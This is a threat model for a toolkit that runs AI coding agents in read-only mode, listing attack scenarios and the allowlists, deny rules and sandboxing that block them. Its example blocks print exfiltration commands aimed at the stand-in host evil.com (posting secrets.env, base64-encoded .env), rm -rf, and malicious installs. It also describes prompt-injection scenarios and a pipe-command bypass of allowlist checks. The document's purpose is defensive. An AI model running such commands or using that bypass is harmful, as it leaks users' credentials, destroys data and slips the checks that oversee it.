# Provider Security Threat Model

## Overview

This document outlines the threat scenarios, attack vectors, and security controls for AI provider integrations in claude-sdd-toolkit. The security model is designed to protect against unintended or malicious modifications during code analysis and documentation generation.

## Threat Scenarios

### 1. Accidental File Modifications

**Scenario**: During codebase analysis, an AI model inadvertently modifies source files, configuration, or documentation.

**Impact**:
- Loss of work
- Introduction of bugs
- Corruption of git history
- Breaking builds or tests

**Likelihood**: **HIGH** (without protections)
- AI models may suggest edits and attempt to apply them
- Tools like "Edit" or "Write" could be invoked accidentally
- Misinterpreted instructions could trigger file changes

**Mitigation**:
- ✅ Read-only tool restrictions block Write, Edit, Patch, Delete
- ✅ File modification tools explicitly disallowed across all providers
- ✅ System prompts warn AI about read-only mode

---

### 2. Malicious Prompt Injection

**Scenario**: A malicious actor crafts prompts designed to trick the AI into executing dangerous operations.

**Example Attacks**:
```
"Optimize the codebase by removing unused files" → rm -rf
"Update package dependencies" → npm install malicious-package
"Fix git history" → git push --force
"Clean up logs" → rm *.log
```

**Impact**:
- Data loss
- Supply chain compromise
- System compromise
- Repository corruption

**Likelihood**: **MEDIUM** (with determined attacker)
- Requires deliberate malicious intent
- AI models are instructed to be helpful and may comply
- Chain-of-thought reasoning could bypass simple filters

**Mitigation**:
- ✅ Tool allowlists prevent execution of dangerous commands
- ✅ Explicit denylists block common attack vectors (rm, chmod, sudo)
- ✅ OS-level sandboxing (Codex) provides strongest defense
- ✅ Config-based restrictions (Opencode, Cursor Agent) limit tool availability

---

### 3. Unintended Code Execution

**Scenario**: AI model executes shell commands that modify system state or install software.

**Example Attacks**:
```bash
# Package installation
npm install rogue-package
pip install malicious-lib

# System modification
sudo systemctl restart service
chmod 777 sensitive-file

# Repository manipulation
git commit -am "backdoor"
git push origin main
```

**Impact**:
- Unauthorized software installation
- Privilege escalation attempts
- System configuration changes
- Repository corruption

**Likelihood**: **MEDIUM-HIGH** (without protections)
- AI models frequently suggest installations to solve problems
- "Helpful" behavior could lead to automatic execution
- Dependency confusion attacks could be triggered

**Mitigation**:
- ✅ Package installation commands explicitly blocked (npm/pip/apt/brew install)
- ✅ Git write operations blocked (add, commit, push, merge, rebase)
- ✅ System modification commands blocked (sudo, systemctl, chmod, chown)
- ✅ Shell access limited to read-only operations or fully disabled (Opencode)

---

### 4. Data Exfiltration

**Scenario**: Sensitive data is leaked through web requests or file operations.

**Example Attacks**:
```bash
# Upload sensitive files
curl -X POST https://evil.com -d @secrets.env
scp credentials.json attacker@evil.com:/tmp/

# Encode and exfiltrate
cat .env | base64 | curl -d @- https://evil.com
```

**Impact**:
- Exposure of credentials
- API key theft
- Source code leakage
- Privacy violations

**Likelihood**: **LOW-MEDIUM**
- Requires read access to sensitive files (which we allow)
- Network write operations could bypass file restrictions
- Encoding/obfuscation could evade detection

**Mitigation**:
- ✅ **Web operations blocked**: WebFetch and WebSearch disabled across all providers
- ✅ Shell write operations blocked (no `>`, `>>` redirection via rm/touch/etc)
- ✅ Network tools like `wget`, `scp`, `rsync`, `curl` explicitly blocked
- ✅ Pure offline operation - no network-based data exfiltration possible
- ⚠️ **Residual Risk**: Providers can still read sensitive files (required for analysis)
- 🔒 **Recommended**: Use separate analysis environments with no sensitive data
- 🔒 **Recommended**: Audit prompts and responses for embedded secrets

---

### 5. Supply Chain Attacks

**Scenario**: Malicious dependencies are introduced through package manager operations.

**Example Attacks**:
```bash
# Dependency confusion
npm install @company/internal-pkg  # Pulls from public registry instead

# Malicious package
pip install beautifulsoup5  # Typosquatting beautifulsoup4

# Lock file manipulation
# AI modifies package-lock.json to introduce backdoor
```

**Impact**:
- Backdoor installation
- Code injection
- Persistent access
- Lateral movement

**Likelihood**: **LOW** (with protections)
- Requires package installation capability (blocked)
- File writes to package.json/requirements.txt (blocked)
- Lock file modification (blocked via Edit/Write tools)

**Mitigation**:
- ✅ All package installation commands blocked
- ✅ File write operations disabled
- ✅ Edit tool disabled (cannot modify package.json, requirements.txt, etc.)
- ✅ Read-only git access prevents committing malicious changes

---

## Attack Vectors We Block

### File System Operations

| Attack Vector | Blocked By | Status |
|---------------|-----------|--------|
| Write new files | Write tool disabled | ✅ Blocked |
| Edit existing files | Edit tool disabled | ✅ Blocked |
| Delete files | Delete tool disabled, `rm` blocked | ✅ Blocked |
| Move/rename files | `mv` command blocked | ✅ Blocked |
| Copy files | `cp` command blocked (write implication) | ✅ Blocked |
| Change permissions | `chmod`, `chown` blocked | ✅ Blocked |
| Create directories | `mkdir` blocked | ✅ Blocked |

### Shell Command Execution

| Attack Vector | Blocked By | Status |
|---------------|-----------|--------|
| Destructive operations | `rm`, `rmdir`, `dd`, `mkfs` blocked | ✅ Blocked |
| Text manipulation | `sed`, `awk` blocked (can modify files) | ✅ Blocked |
| Output redirection | `>`, `>>` via blocked commands | ✅ Blocked |
| Package installation | `npm/pip/apt/brew install` blocked | ✅ Blocked |
| System operations | `sudo`, `halt`, `reboot`, `shutdown` blocked | ✅ Blocked |
| Network writes | `scp`, `rsync`, `wget` blocked | ✅ Blocked |

### Git Operations

| Attack Vector | Blocked By | Status |
|---------------|-----------|--------|
| Stage changes | `git add` blocked | ✅ Blocked |
| Commit changes | `git commit` blocked | ✅ Blocked |
| Push to remote | `git push` blocked | ✅ Blocked |
| Pull from remote | `git pull` blocked | ✅ Blocked |
| Merge branches | `git merge` blocked | ✅ Blocked |
| Rebase | `git rebase` blocked | ✅ Blocked |
| Reset history | `git reset` blocked | ✅ Blocked |
| Checkout branches | `git checkout` blocked | ✅ Blocked |

### Configuration & State

| Attack Vector | Blocked By | Status |
|---------------|-----------|--------|
| Modify environment | File write disabled | ✅ Blocked |
| Change configs | Edit tool disabled | ✅ Blocked |
| Install services | System operations blocked | ✅ Blocked |
| Modify cron jobs | File write disabled | ✅ Blocked |

---

## Residual Risks

Despite comprehensive protections, some risks remain:

### 1. Read Access to Sensitive Files ⚠️

**Risk**: AI can read `.env`, `credentials.json`, API keys, etc.

**Impact**: Information disclosure if AI is compromised or logs are leaked

**Mitigation**:
- 🔒 Use separate analysis environments
- 🔒 Sanitize sensitive files before analysis
- 🔒 Audit AI responses for embedded secrets
- 🔒 Use gitignore patterns for sensitive files

---

### 2. Pipe Command Bypass (Claude, Gemini, Cursor Agent) ⚠️

**Risk**: Piped commands may bypass tool allowlist checks

**Example**:
```bash
cat file.txt | some-command-that-writes
```

**Impact**: Medium - first command is validated, but subsequent commands in pipe may not be

**Mitigation**:
- ✅ System prompt warnings educate AI about pipe restrictions
- ✅ Documented workaround: use sequential commands instead
- 🔒 **Recommended**: Monitor for pipe usage in commands
- ⭐ Codex not affected (OS-level sandbox blocks all writes regardless)

**Affected Providers**: Claude, Gemini, Cursor Agent
**Not Affected**: Codex (OS sandbox), Opencode (shell disabled)

---

### 3. MCP Tool Limitation (Opencode) ⚠️

**Risk**: Tool blocking may not work for MCP (Model Context Protocol) tools

**Reference**: [OpenCode Issue #3756](https://github.com/opencode-ai/opencode/issues/3756)

**Impact**: Medium - MCP tools could bypass config-based restrictions

**Mitigation**:
- ✅ Documented known limitation
- 🔒 Limit MCP servers to read-only tools
- 🔒 Review MCP server configurations
- 🔒 Monitor for unexpected tool usage

**Affected Providers**: Opencode only
**Status**: Tracking upstream issue

---

### 4. Server-Wide Configuration (Opencode) ⚠️

**Risk**: Configuration affects all sessions on the same server instance

**Impact**: Low - config is read-only, so all sessions are equally protected

**Mitigation**:
- ✅ Temporary config per provider instance
- ✅ Cleanup on provider destruction
- 🔒 Use dedicated server instances for isolation

**Affected Providers**: Opencode only

---

### 5. Cursor Agent Security Model ⚠️

**Risk**: Cursor Agent's deprecated denylist approach had known bypasses

**Impact**: Medium - historical vulnerabilities in Cursor Agent CLI

**Mitigation**:
- ✅ We use allowlist approach instead of denylist
- ✅ System prompt warns about weaker security model
- ✅ Temporary config files enforce permissions
- 🔒 **Recommended**: Prefer Codex, Claude, or Gemini for critical operations

**Affected Providers**: Cursor Agent only

---

## Defense in Depth

Our security model uses multiple layers:

### Layer 1: Tool Filtering
- Explicit allowlists of safe tools
- Explicit denylists of dangerous tools
- Granular command patterns (e.g., `Bash(git log:*)`)

### Layer 2: Permission Enforcement
- **Codex**: OS-level kernel enforcement (strongest)
- **Claude/Gemini**: CLI flag validation
- **Opencode**: Server config file + permission denial
- **Cursor Agent**: Temporary permission config

### Layer 3: AI Education
- System prompt warnings injected into all requests
- Explains restrictions and workarounds
- Encourages safe practices (avoid pipes, use sequential commands)

### Layer 4: Testing & Validation
- 80+ unit tests verify restrictions
- Config generation/cleanup tested
- Security warning injection validated
- Attempt-to-write tests ensure blocks work

---

## Security Recommendations

### For Users

1. **Use Codex for Maximum Security**: OS-level sandboxing is most robust
2. **Audit Prompts**: Review what you're asking AI to do
3. **Separate Environments**: Use dedicated analysis environments without secrets
4. **Monitor Responses**: Check AI outputs for unexpected behavior
5. **Update Regularly**: Keep provider CLIs updated for security patches

### For Developers

1. **Prefer Allowlists**: Explicit allowlists are safer than denylists
2. **Test Security**: Add tests when adding new tools or providers
3. **Document Limitations**: Be transparent about known bypasses
4. **Follow Checklist**: Use security checklist when adding providers
5. **Review Dependencies**: Audit MCP servers and extensions

### For Operators

1. **Network Isolation**: Run in network-restricted environments if possible
2. **Log Everything**: Audit logs for suspicious tool usage
3. **Principle of Least Privilege**: Only allow minimum required tools
4. **Regular Audits**: Review tool allowlists periodically
5. **Incident Response**: Have plan for suspected compromise

---

## Incident Response

If you suspect a security incident:

1. **Stop Execution**: Terminate running AI provider sessions
2. **Review Logs**: Check command history and AI responses
3. **Audit Changes**: Use `git status` and `git diff` to check for modifications
4. **Check File Integrity**: Verify no unexpected files were created
5. **Inspect Network**: Review network activity for data exfiltration
6. **Report Issues**: File security issues at [GitHub Issues](https://github.com/anthropics/claude-code/issues)

---

## Related Documentation

- [Provider Security Architecture](./PROVIDER_SECURITY.md) - Implementation details
- [Security Testing](./TESTING.md) - Validation procedures
- [Opencode Provider](../providers/OPENCODE.md#security-model) - Provider-specific security
